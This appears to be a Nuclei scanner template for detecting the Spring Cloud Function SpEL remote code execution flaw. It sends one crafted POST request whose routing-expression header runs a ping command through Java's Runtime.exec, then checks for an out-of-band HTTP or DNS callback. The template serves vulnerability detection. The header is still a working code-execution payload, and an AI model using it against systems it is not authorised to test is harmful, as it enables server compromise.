id: springcloud-function-spel-rce 

info:
  name: springcloud-function-spel-rce
  author: Mr-xn
  severity: critical
  description: springcloud-function-spel-rce
  reference:
    - https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f
    - https://github.com/cckuailong/spring-cloud-function-SpEL-RCE
  tags: spring,springcloud,rce

requests:
  - raw:
      - |
        POST /{{rand_base(8)}} HTTP/1.1
        Host: {{Hostname}}
        spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("ping {{interactsh-url}}")
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 3

        any 

    matchers-condition: or
    matchers:
      - type: word
        part: interactsh_protocol
        name: http
        words:
          - "http"

      - type: word
        part: interactsh_protocol
        name: dns
        words:
          - "dns"
